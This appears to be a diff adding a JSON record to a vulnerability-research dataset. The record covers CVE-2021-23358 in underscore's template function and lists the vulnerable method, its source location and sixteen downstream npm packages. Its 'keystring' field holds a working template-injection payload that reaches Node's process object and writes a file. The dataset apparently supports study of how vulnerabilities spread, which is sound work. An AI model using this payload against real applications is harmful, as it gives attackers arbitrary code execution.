@@ -1,0 +1,25 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.2.1",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "dep-graph@1.1.0",
+    "multiparter@0.1.4",
+    "amazon-ses@0.0.3",
+    "ql.io-engine@0.3.17",
+    "multimethod@0.1.0",
+    "ql.io-console@0.3.8",
+    "uquery@0.0.1",
+    "underscored@0.1.5",
+    "transloadit@1.0.0",
+    "rewriter@0.0.10",
+    "more@0.1.6",
+    "node-transloadit@0.0.2",
+    "node-sprite@0.0.4",
+    "amazon-ses-with-region@0.0.3",
+    "ExpressMVC@0.0.1",
+    "@banzai-inc/multimethod@0.1.0"
+  ]
+}
